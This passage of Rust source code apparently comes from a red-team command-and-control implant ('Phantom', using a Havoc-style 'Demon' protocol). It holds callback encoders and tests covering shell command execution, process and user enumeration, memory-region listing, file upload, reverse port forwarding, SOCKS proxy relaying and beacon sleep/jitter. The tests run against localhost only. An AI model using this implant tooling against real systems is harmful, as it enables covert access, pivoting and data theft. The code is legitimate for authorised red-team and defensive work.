    payload.extend_from_slice(&encode_u32(bind_addr));
    payload.extend_from_slice(&encode_u32(bind_port));
    payload
}

fn encode_socks_proxy_remove(socket_id: u32) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyRemove));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload
}

fn encode_rportfwd_remove(
    socket_id: u32,
    socket_type: DemonSocketType,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardRemove));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_u32(bind_addr));
    payload.extend_from_slice(&encode_u32(bind_port));
    payload.extend_from_slice(&encode_u32(forward_addr));
    payload.extend_from_slice(&encode_u32(forward_port));
    payload
}

fn encode_socket_clear(success: bool) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardClear));
    payload.extend_from_slice(&encode_bool(success));
    payload
}

fn encode_socks_proxy_clear(success: bool) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyClear));
    payload.extend_from_slice(&encode_bool(success));
    payload
}

/// Encode a `DemonCallback::File` (file-open) payload for `BeaconOutput`.
///
/// Wire format: `[callback_type:u32][len:u32][file_id:u32][file_size:u32][path:UTF-8]`
fn encode_file_open(
    file_id: u32,
    file_size: u64,
    file_path: &str,
) -> Result<Vec<u8>, PhantomError> {
    let truncated_size = u32::try_from(file_size.min(u64::from(u32::MAX)))
        .map_err(|_| PhantomError::InvalidResponse("file size overflow"))?;
    let inner_len = 4 + 4 + file_path.len();
    let mut payload = Vec::with_capacity(4 + 4 + inner_len);
    payload.extend_from_slice(&encode_u32(u32::from(DemonCallback::File)));
    payload.extend_from_slice(&encode_u32(
        u32::try_from(inner_len)
            .map_err(|_| PhantomError::InvalidResponse("file open inner too large"))?,
    ));
    payload.extend_from_slice(&encode_u32(file_id));
    payload.extend_from_slice(&encode_u32(truncated_size));
    payload.extend_from_slice(file_path.as_bytes());
    Ok(payload)
}

/// Encode a `DemonCallback::FileWrite` (chunk) payload for `BeaconOutput`.
///
/// Wire format: `[callback_type:u32][len:u32][file_id:u32][chunk_data]`
fn encode_file_chunk(file_id: u32, data: &[u8]) -> Result<Vec<u8>, PhantomError> {
    let inner_len = 4 + data.len();
    let mut payload = Vec::with_capacity(4 + 4 + inner_len);
    payload.extend_from_slice(&encode_u32(u32::from(DemonCallback::FileWrite)));
    payload.extend_from_slice(&encode_u32(
        u32::try_from(inner_len)
            .map_err(|_| PhantomError::InvalidResponse("file chunk inner too large"))?,
    ));
    payload.extend_from_slice(&encode_u32(file_id));
    payload.extend_from_slice(data);
    Ok(payload)
}

/// Encode a `DemonCallback::FileClose` payload for `BeaconOutput`.
///
/// Wire format: `[callback_type:u32][len:u32][file_id:u32]`
fn encode_file_close(file_id: u32) -> Result<Vec<u8>, PhantomError> {
    let mut payload = Vec::with_capacity(12);
    payload.extend_from_slice(&encode_u32(u32::from(DemonCallback::FileClose)));
    payload.extend_from_slice(&encode_u32(4));
    payload.extend_from_slice(&encode_u32(file_id));
    Ok(payload)
}

/// Encode a `CommandTransfer` response payload.
fn encode_transfer_list(downloads: &[ActiveDownload]) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonTransferCommand::List));
    for download in downloads {
        payload.extend_from_slice(&encode_u32(download.file_id));
        let read_size = u32::try_from(download.read_size).unwrap_or(u32::MAX);
        payload.extend_from_slice(&encode_u32(read_size));
        payload.extend_from_slice(&encode_u32(download.state as u32));
    }
    payload
}

/// Encode a transfer stop/resume/remove response payload.
fn encode_transfer_action(subcommand: DemonTransferCommand, found: bool, file_id: u32) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(subcommand));
    payload.extend_from_slice(&encode_bool(found));
    payload.extend_from_slice(&encode_u32(file_id));
    payload
}

/// Encode the secondary close callback sent after a transfer remove, matching Demon behaviour.
///
/// Wire format: `[subcommand:u32][file_id:u32][reason:u32]`
/// Reason 1 = `DOWNLOAD_REASON_REMOVED`.
fn encode_transfer_remove_close(file_id: u32) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonTransferCommand::Remove));
    payload.extend_from_slice(&encode_u32(file_id));
    payload.extend_from_slice(&encode_u32(1)); // DOWNLOAD_REASON_REMOVED
    payload
}

impl PendingCallback {
    pub(crate) fn command_id(&self) -> u32 {
        match self {
            Self::Output { .. } => u32::from(DemonCommand::CommandOutput),
            Self::Error { .. } => u32::from(DemonCommand::CommandError),
            Self::Exit { .. } => u32::from(DemonCommand::CommandExit),
            Self::KillDate { .. } => u32::from(DemonCommand::CommandKillDate),
            Self::Structured { command_id, .. } => *command_id,
            Self::MemFileAck { .. } => u32::from(DemonCommand::CommandMemFile),
            Self::FsUpload { .. } => u32::from(DemonCommand::CommandFs),
            Self::Socket { .. } => u32::from(DemonCommand::CommandSocket),
            Self::FileOpen { .. } | Self::FileChunk { .. } | Self::FileClose { .. } => {
                u32::from(DemonCommand::BeaconOutput)
            }
        }
    }

    pub(crate) fn request_id(&self) -> u32 {
        match self {
            Self::Output { request_id, .. }
            | Self::Error { request_id, .. }
            | Self::Exit { request_id, .. }
            | Self::KillDate { request_id, .. }
            | Self::Structured { request_id, .. }
            | Self::MemFileAck { request_id, .. }
            | Self::FsUpload { request_id, .. }
            | Self::Socket { request_id, .. }
            | Self::FileOpen { request_id, .. }
            | Self::FileChunk { request_id, .. }
            | Self::FileClose { request_id, .. } => *request_id,
        }
    }

    pub(crate) fn payload(&self) -> Result<Vec<u8>, PhantomError> {
        match self {
            Self::Output { text, .. } => encode_bytes(text.as_bytes()),
            Self::Error { text, .. } => {
                let mut payload = Vec::new();
                payload.extend_from_slice(&encode_u32(0x0d));
                payload.extend_from_slice(&encode_bytes(text.as_bytes())?);
                Ok(payload)
            }
            Self::Exit { exit_method, .. } => Ok(encode_u32(*exit_method)),
            Self::KillDate { .. } => Ok(Vec::new()),
            Self::Structured { payload, .. } => Ok(payload.clone()),
            Self::MemFileAck { mem_file_id, success, .. } => {
                let mut payload = Vec::new();
                payload.extend_from_slice(&encode_u32(*mem_file_id));
                payload.extend_from_slice(&encode_bool(*success));
                Ok(payload)
            }
            Self::FsUpload { file_size, path, .. } => {
                let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Upload));
                payload.extend_from_slice(&encode_u32(*file_size));
                payload.extend_from_slice(&encode_utf16(path)?);
                Ok(payload)
            }
            Self::Socket { payload, .. } => Ok(payload.clone()),
            Self::FileOpen { file_id, file_size, file_path, .. } => {
                encode_file_open(*file_id, *file_size, file_path)
            }
            Self::FileChunk { file_id, data, .. } => encode_file_chunk(*file_id, data),
            Self::FileClose { file_id, .. } => encode_file_close(*file_id),
        }
    }
}

#[cfg(test)]
mod tests {
    use std::time::Duration;

    use std::net::Ipv4Addr;

    use red_cell_common::demon::{
        DemonCallback, DemonCommand, DemonFilesystemCommand, DemonNetCommand, DemonPackage,
        DemonProcessCommand, DemonSocketCommand, DemonTransferCommand,
    };
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    use super::{
        DownloadTransferState, GroupEntry, MEM_COMMIT, MEM_IMAGE, MEM_MAPPED, MEM_PRIVATE,
        PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PendingCallback, PhantomState,
        SessionEntry, UserEntry, execute, parse_group_entries, parse_logged_on_sessions,
        parse_logged_on_users, parse_memory_region, parse_user_entries,
    };
    use crate::config::PhantomConfig;

    fn utf16_payload(value: &str) -> Vec<u8> {
        let utf16 = value.encode_utf16().flat_map(u16::to_le_bytes).collect::<Vec<_>>();
        let mut payload = Vec::with_capacity(4 + utf16.len());
        payload.extend_from_slice(&(utf16.len() as i32).to_le_bytes());
        payload.extend_from_slice(&utf16);
        payload
    }

    fn read_u32(payload: &[u8], offset: &mut usize) -> u32 {
        let end = *offset + 4;
        let value = u32::from_le_bytes(payload[*offset..end].try_into().expect("u32"));
        *offset = end;
        value
    }

    fn read_u64(payload: &[u8], offset: &mut usize) -> u64 {
        let end = *offset + 8;
        let value = u64::from_le_bytes(payload[*offset..end].try_into().expect("u64"));
        *offset = end;
        value
    }

    fn read_bytes<'a>(payload: &'a [u8], offset: &mut usize) -> &'a [u8] {
        let len = read_u32(payload, offset) as usize;
        let end = *offset + len;
        let bytes = &payload[*offset..end];
        *offset = end;
        bytes
    }

    fn read_utf16(payload: &[u8], offset: &mut usize) -> String {
        let bytes = read_bytes(payload, offset);
        let utf16 = bytes
            .chunks_exact(2)
            .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
            .collect::<Vec<_>>();
        String::from_utf16(&utf16).expect("utf16")
    }

    async fn poll_until<F>(state: &mut PhantomState, mut predicate: F)
    where
        F: FnMut(&PhantomState) -> bool,
    {
        for _ in 0..100 {
            state.poll().await.expect("poll");
            if predicate(state) {
                return;
            }
            tokio::time::sleep(Duration::from_millis(10)).await;
        }

        panic!("condition not met before poll timeout");
    }

    async fn poll_n(state: &mut PhantomState, iterations: usize) {
        for _ in 0..iterations {
            state.poll().await.expect("poll");
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
    }

    #[tokio::test]
    async fn command_no_job_returns_no_callbacks() {
        let package = DemonPackage::new(DemonCommand::CommandNoJob, 1, Vec::new());
        let mut state = PhantomState::default();
        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
        assert!(state.drain_callbacks().is_empty());
    }

    #[tokio::test]
    async fn command_sleep_updates_config_and_queues_callback() {
        let mut payload = Vec::new();
        payload.extend_from_slice(&3000_i32.to_le_bytes());
        payload.extend_from_slice(&25_i32.to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandSleep, 7, payload);
        let mut config = PhantomConfig::default();
        let mut state = PhantomState::default();

        execute(&package, &mut config, &mut state).await.expect("execute");

        assert_eq!(config.sleep_delay_ms, 3000, "sleep_delay_ms must be updated");
        assert_eq!(config.sleep_jitter, 25, "sleep_jitter must be updated");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Output { request_id, text }] = callbacks.as_slice() else {
            panic!("expected one Output callback, got: {callbacks:?}");
        };
        assert_eq!(*request_id, 7);
        assert!(text.contains("3000"), "callback text should mention new delay: {text}");
    }

    #[tokio::test]
    async fn command_sleep_clamps_jitter_to_100() {
        let mut payload = Vec::new();
        payload.extend_from_slice(&1000_i32.to_le_bytes());
        payload.extend_from_slice(&150_i32.to_le_bytes()); // over 100
        let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
        let mut config = PhantomConfig::default();
        let mut state = PhantomState::default();

        execute(&package, &mut config, &mut state).await.expect("execute");

        assert_eq!(config.sleep_delay_ms, 1000);
        assert_eq!(config.sleep_jitter, 100, "jitter exceeding 100 must be clamped");
    }

    #[tokio::test]
    async fn command_sleep_missing_jitter_defaults_to_zero() {
        let mut payload = Vec::new();
        payload.extend_from_slice(&2000_i32.to_le_bytes());
        // no jitter field
        let package = DemonPackage::new(DemonCommand::CommandSleep, 2, payload);
        let mut config = PhantomConfig { sleep_jitter: 10, ..PhantomConfig::default() };
        let mut state = PhantomState::default();

        execute(&package, &mut config, &mut state).await.expect("execute");

        assert_eq!(config.sleep_delay_ms, 2000);
        assert_eq!(config.sleep_jitter, 0, "missing jitter field must default to 0");
    }

    #[tokio::test]
    async fn get_pwd_queues_structured_fs_callback() {
        let mut payload = Vec::new();
        payload.extend_from_slice(&(DemonFilesystemCommand::GetPwd as i32).to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { command_id, request_id, payload }] =
            callbacks.as_slice()
        else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandFs));
        assert_eq!(*request_id, 1);

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonFilesystemCommand::GetPwd));
        let path = read_utf16(payload, &mut offset);
        assert!(!path.is_empty());
    }

    #[tokio::test]
    async fn proc_create_with_pipe_returns_structured_and_output_callbacks() {
        let mut payload = Vec::new();
        payload.extend_from_slice(&(DemonProcessCommand::Create as i32).to_le_bytes());
        payload.extend_from_slice(&0_i32.to_le_bytes());
        payload.extend_from_slice(&utf16_payload("/bin/sh"));
        payload.extend_from_slice(&utf16_payload("printf phantom-test"));
        payload.extend_from_slice(&1_i32.to_le_bytes());
        payload.extend_from_slice(&0_i32.to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandProc, 2, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [
            PendingCallback::Structured { command_id, request_id, payload },
            PendingCallback::Output { request_id: output_request_id, text },
        ] = callbacks.as_slice()
        else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandProc));
        assert_eq!(*request_id, 2);
        assert_eq!(*output_request_id, 2);
        assert_eq!(text, "phantom-test");

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonProcessCommand::Create));
        assert_eq!(read_utf16(payload, &mut offset), "/bin/sh");
        assert!(read_u32(payload, &mut offset) > 0);
        assert_eq!(read_u32(payload, &mut offset), 1);
        assert_eq!(read_u32(payload, &mut offset), 1);
        assert_eq!(read_u32(payload, &mut offset), 0);
    }

    #[tokio::test]
    async fn proc_list_returns_structured_process_payload() {
        let package =
            DemonPackage::new(DemonCommand::CommandProcList, 7, 0_i32.to_le_bytes().to_vec());
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { command_id, request_id, payload }] =
            callbacks.as_slice()
        else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandProcList));
        assert_eq!(*request_id, 7);

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), 0);
        assert!(offset < payload.len());
    }

    #[tokio::test]
    async fn net_domain_returns_structured_payload() {
        let package = DemonPackage::new(
            DemonCommand::CommandNet,
            8,
            (DemonNetCommand::Domain as i32).to_le_bytes().to_vec(),
        );
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { command_id, request_id, payload }] =
            callbacks.as_slice()
        else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(*request_id, 8);

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonNetCommand::Domain));
        let _domain = std::str::from_utf8(read_bytes(payload, &mut offset)).expect("utf8");
    }

    #[tokio::test]
    async fn net_users_returns_structured_payload_instead_of_stub_error() {
        let mut payload = Vec::new();
        payload.extend_from_slice(&(DemonNetCommand::Users as i32).to_le_bytes());
        payload.extend_from_slice(&utf16_payload("HOST01"));
        let package = DemonPackage::new(DemonCommand::CommandNet, 9, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { command_id, request_id, payload }] =
            callbacks.as_slice()
        else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(*request_id, 9);

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonNetCommand::Users));
        assert_eq!(read_utf16(payload, &mut offset), "HOST01");
        assert!(offset < payload.len(), "expected at least one passwd-backed user");
        let _username = read_utf16(payload, &mut offset);
        let _is_admin = read_u32(payload, &mut offset);
    }

    #[tokio::test]
    async fn net_computer_echoes_target_with_structured_payload() {
        let mut payload = Vec::new();
        payload.extend_from_slice(&(DemonNetCommand::Computer as i32).to_le_bytes());
        payload.extend_from_slice(&utf16_payload("CORP.LOCAL"));
        let package = DemonPackage::new(DemonCommand::CommandNet, 10, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { command_id, request_id, payload }] =
            callbacks.as_slice()
        else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(*request_id, 10);

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonNetCommand::Computer));
        assert_eq!(read_utf16(payload, &mut offset), "CORP.LOCAL");
    }

    #[tokio::test]
    async fn proc_memory_returns_structured_payload_instead_of_stub_error() {
        let mut payload = Vec::new();
        payload.extend_from_slice(&(DemonProcessCommand::Memory as i32).to_le_bytes());
        payload.extend_from_slice(&0_i32.to_le_bytes());
        payload.extend_from_slice(&0_i32.to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandProc, 11, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { command_id, request_id, payload }] =
            callbacks.as_slice()
        else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandProc));
        assert_eq!(*request_id, 11);

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonProcessCommand::Memory));
        assert_eq!(read_u32(payload, &mut offset), 0);
        assert_eq!(read_u32(payload, &mut offset), 0);
        assert!(offset < payload.len(), "expected at least one memory region");
        let _base = read_u64(payload, &mut offset);
        let _size = read_u32(payload, &mut offset);
        let _protect = read_u32(payload, &mut offset);
        let _state = read_u32(payload, &mut offset);
        let _type = read_u32(payload, &mut offset);
    }

    #[tokio::test]
    async fn memfile_then_upload_emits_expected_callbacks() {
        let content = b"phantom-upload";

        let mut memfile = Vec::new();
        memfile.extend_from_slice(&77_i32.to_le_bytes());
        memfile.extend_from_slice(&(content.len() as i64).to_le_bytes());
        memfile.extend_from_slice(&(content.len() as i32).to_le_bytes());
        memfile.extend_from_slice(content);

        let tempdir = tempfile::tempdir().expect("tempdir");
        let path = tempdir.path().join("upload.bin");

        let mut upload = Vec::new();
        upload.extend_from_slice(&(DemonFilesystemCommand::Upload as i32).to_le_bytes());
        upload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
        upload.extend_from_slice(&77_i32.to_le_bytes());

        let mut state = PhantomState::default();
        execute(
            &DemonPackage::new(DemonCommand::CommandMemFile, 3, memfile),
            &mut PhantomConfig::default(),
            &mut state,
        )
        .await
        .expect("memfile");
        execute(
            &DemonPackage::new(DemonCommand::CommandFs, 4, upload),
            &mut PhantomConfig::default(),
            &mut state,
        )
        .await
        .expect("upload");

        let callbacks = state.drain_callbacks();
        assert!(matches!(
            callbacks.as_slice(),
            [
                PendingCallback::MemFileAck { request_id: 3, mem_file_id: 77, success: true },
                PendingCallback::FsUpload { request_id: 4, file_size, .. }
            ] if *file_size == content.len() as u32
        ));
        assert_eq!(std::fs::read(path).expect("read back"), content);
    }

    #[tokio::test]
    async fn reverse_port_forward_add_queues_socket_callback() {
        let listener = std::net::TcpListener::bind(("127.0.0.1", 0)).expect("reserve port");
        let port = listener.local_addr().expect("addr").port();
        drop(listener);

        let mut payload = Vec::new();
        payload
            .extend_from_slice(&(DemonSocketCommand::ReversePortForwardAdd as i32).to_le_bytes());
        payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
        payload.extend_from_slice(&(i32::from(port)).to_le_bytes());
        payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
        payload.extend_from_slice(&8080_i32.to_le_bytes());

        let mut state = PhantomState::default();
        execute(
            &DemonPackage::new(DemonCommand::CommandSocket, 5, payload),
            &mut PhantomConfig::default(),
            &mut state,
        )
        .await
        .expect("socket");

        assert!(matches!(
            state.drain_callbacks().as_slice(),
            [PendingCallback::Socket { request_id: 5, .. }]
        ));
    }

    #[tokio::test]
    async fn reverse_port_forward_add_local_relays_data() {
        let target = tokio::net::TcpListener::bind(("127.0.0.1", 0)).await.expect("bind target");
        let target_port = target.local_addr().expect("target addr").port();
        let target_task = tokio::spawn(async move {
            let (mut stream, _) = target.accept().await.expect("accept target");
            let mut buffer = [0_u8; 32];
            let read = stream.read(&mut buffer).await.expect("read target");
            stream.write_all(&buffer[..read]).await.expect("write target");
        });

        // Pass port 0 so the OS assigns an available port atomically, eliminating the
        // TOCTOU race that caused this test to fail non-deterministically under parallel
        // execution (reserve-port-then-drop would let another test grab the port).
        let mut payload = Vec::new();
        payload.extend_from_slice(
            &(DemonSocketCommand::ReversePortForwardAddLocal as i32).to_le_bytes(),
        );
        payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
        payload.extend_from_slice(&0_i32.to_le_bytes());
        payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
        payload.extend_from_slice(&(i32::from(target_port)).to_le_bytes());

        let mut state = PhantomState::default();
        execute(
            &DemonPackage::new(DemonCommand::CommandSocket, 6, payload),
            &mut PhantomConfig::default(),
            &mut state,
        )
        .await
        .expect("socket");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Socket { request_id: 6, payload }] = callbacks.as_slice() else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        let mut offset = 0;
        assert_eq!(
            read_u32(payload, &mut offset),
            u32::from(DemonSocketCommand::ReversePortForwardAddLocal)
        );
        assert_eq!(read_u32(payload, &mut offset), 1);
        // Skip socket_id and bind_addr fields to reach the bound port assigned by the OS.
        let _socket_id = read_u32(payload, &mut offset);
        let _bind_addr = read_u32(payload, &mut offset);
        let bind_port = read_u32(payload, &mut offset) as u16;

        let mut client = tokio::net::TcpStream::connect(("127.0.0.1", bind_port))
            .await
            .expect("connect listener");
        poll_until(&mut state, |state| !state.local_relays.is_empty()).await;

        client.write_all(b"phantom-rportfwd").await.expect("write client");
        poll_n(&mut state, 10).await;
        let mut echoed = vec![0_u8; "phantom-rportfwd".len()];
        tokio::time::timeout(Duration::from_secs(1), client.read_exact(&mut echoed))
            .await
            .expect("read timeout")
            .expect("read echoed");
        assert_eq!(echoed, b"phantom-rportfwd");

        drop(client);
        poll_until(&mut state, |state| state.local_relays.is_empty()).await;
        target_task.await.expect("target task");
    }

    #[tokio::test]
    async fn socks_proxy_commands_manage_listener_lifecycle() {
        let mut add_payload = Vec::new();
        add_payload.extend_from_slice(&(DemonSocketCommand::SocksProxyAdd as i32).to_le_bytes());
        add_payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
        add_payload.extend_from_slice(&0_i32.to_le_bytes());

        let mut state = PhantomState::default();
        execute(
            &DemonPackage::new(DemonCommand::CommandSocket, 7, add_payload),
            &mut PhantomConfig::default(),
            &mut state,
        )
        .await
        .expect("socks add");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Socket { request_id: 7, payload }] = callbacks.as_slice() else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonSocketCommand::SocksProxyAdd));
        assert_eq!(read_u32(payload, &mut offset), 1);
        let socket_id = read_u32(payload, &mut offset);
        assert_ne!(socket_id, 0);
        assert_eq!(read_u32(payload, &mut offset), u32::from(Ipv4Addr::LOCALHOST));
        let bound_port = read_u32(payload, &mut offset);
        assert_ne!(bound_port, 0);
        assert_eq!(state.socks_proxies.len(), 1);

        let list_payload = (DemonSocketCommand::SocksProxyList as i32).to_le_bytes().to_vec();
        execute(
            &DemonPackage::new(DemonCommand::CommandSocket, 8, list_payload),
            &mut PhantomConfig::default(),
            &mut state,
        )
        .await
        .expect("socks list");
        let callbacks = state.drain_callbacks();
        let [PendingCallback::Socket { request_id: 8, payload }] = callbacks.as_slice() else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonSocketCommand::SocksProxyList));
        assert_eq!(read_u32(payload, &mut offset), socket_id);
        assert_eq!(read_u32(payload, &mut offset), u32::from(Ipv4Addr::LOCALHOST));
        assert_eq!(read_u32(payload, &mut offset), bound_port);

        let mut remove_payload = Vec::new();
        remove_payload
            .extend_from_slice(&(DemonSocketCommand::SocksProxyRemove as i32).to_le_bytes());
        remove_payload.extend_from_slice(&socket_id.to_le_bytes());
        execute(
            &DemonPackage::new(DemonCommand::CommandSocket, 9, remove_payload),
            &mut PhantomConfig::default(),
            &mut state,
        )
        .await
        .expect("socks remove");
        let callbacks = state.drain_callbacks();
        let [PendingCallback::Socket { request_id: 9, payload }] = callbacks.as_slice() else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonSocketCommand::SocksProxyRemove));
        assert_eq!(read_u32(payload, &mut offset), socket_id);
        assert!(state.socks_proxies.is_empty());

        let mut add_payload = Vec::new();
        add_payload.extend_from_slice(&(DemonSocketCommand::SocksProxyAdd as i32).to_le_bytes());
        add_payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
        add_payload.extend_from_slice(&0_i32.to_le_bytes());
        execute(
            &DemonPackage::new(DemonCommand::CommandSocket, 10, add_payload),
            &mut PhantomConfig::default(),
            &mut state,
        )
        .await
        .expect("socks add");
        let _ = state.drain_callbacks();

        let clear_payload = (DemonSocketCommand::SocksProxyClear as i32).to_le_bytes().to_vec();
        execute(
            &DemonPackage::new(DemonCommand::CommandSocket, 11, clear_payload),
            &mut PhantomConfig::default(),
            &mut state,
        )
        .await
        .expect("socks clear");
        let callbacks = state.drain_callbacks();
        let [PendingCallback::Socket { request_id: 11, payload }] = callbacks.as_slice() else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonSocketCommand::SocksProxyClear));
        assert_eq!(read_u32(payload, &mut offset), 1);
        assert!(state.socks_proxies.is_empty());
    }

    #[tokio::test]
    async fn socks_proxy_relays_connect_and_data() {
        let target = tokio::net::TcpListener::bind(("127.0.0.1", 0)).await.expect("bind target");
        let target_port = target.local_addr().expect("target addr").port();
        let target_task = tokio::spawn(async move {
            let (mut stream, _) = target.accept().await.expect("accept target");
            let mut buffer = [0_u8; 32];
            let read = stream.read(&mut buffer).await.expect("read target");
            stream.write_all(&buffer[..read]).await.expect("write target");
        });

        let mut add_payload = Vec::new();
        add_payload.extend_from_slice(&(DemonSocketCommand::SocksProxyAdd as i32).to_le_bytes());
        add_payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
        add_payload.extend_from_slice(&0_i32.to_le_bytes());

        let mut state = PhantomState::default();
        execute(
            &DemonPackage::new(DemonCommand::CommandSocket, 12, add_payload),
            &mut PhantomConfig::default(),
            &mut state,
        )
        .await
        .expect("socks add");
        let callbacks = state.drain_callbacks();
        let [PendingCallback::Socket { payload, .. }] = callbacks.as_slice() else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonSocketCommand::SocksProxyAdd));
        assert_eq!(read_u32(payload, &mut offset), 1);
        let _socket_id = read_u32(payload, &mut offset);
        let _bind_addr = read_u32(payload, &mut offset);
        let proxy_port = read_u32(payload, &mut offset) as u16;

        let mut client =
            tokio::net::TcpStream::connect(("127.0.0.1", proxy_port)).await.expect("connect proxy");
        client.write_all(&[5, 1, 0]).await.expect("write greeting");
        poll_until(&mut state, |state| !state.socks_clients.is_empty()).await;
        let mut greeting = [0_u8; 2];
        tokio::time::timeout(Duration::from_secs(1), client.read_exact(&mut greeting))
            .await
            .expect("greeting timeout")
            .expect("read greeting");
        assert_eq!(greeting, [5, 0]);

        client
            .write_all(&[5, 1, 0, 1, 127, 0, 0, 1, (target_port >> 8) as u8, target_port as u8])
            .await
            .expect("write connect");
        poll_until(&mut state, |state| {
            state
                .socks_clients
                .values()
                .any(|client| matches!(client.state, super::SocksClientState::Relay { .. }))
        })
        .await;

        let mut reply = [0_u8; 10];
        tokio::time::timeout(Duration::from_secs(1), client.read_exact(&mut reply))
            .await
            .expect("reply timeout")
            .expect("read reply");
        assert_eq!(reply[0..2], [5, 0]);

        client.write_all(b"phantom-socks").await.expect("write payload");
        poll_n(&mut state, 10).await;
        let mut echoed = vec![0_u8; "phantom-socks".len()];
        tokio::time::timeout(Duration::from_secs(1), client.read_exact(&mut echoed))
            .await
            .expect("echo timeout")
            .expect("read echo");
        assert_eq!(echoed, b"phantom-socks");

        drop(client);
        poll_until(&mut state, |state| state.socks_clients.is_empty()).await;
        target_task.await.expect("target task");
    }

    #[test]
    fn parse_logged_on_users_deduplicates_and_sorts() {
        let users = parse_logged_on_users(
            "alice pts/0 2026-03-23 10:00 (10.0.0.1)\n\
             bob pts/1 2026-03-23 10:05 (10.0.0.2)\n\
             alice pts/2 2026-03-23 10:10 (10.0.0.3)\n",
        );
        assert_eq!(users, vec!["alice".to_owned(), "bob".to_owned()]);
    }

    #[test]
    fn parse_logged_on_sessions_prefers_remote_host_when_present() {
        let sessions = parse_logged_on_sessions(
            "alice pts/0 2026-03-23 10:00 (10.0.0.1)\n\
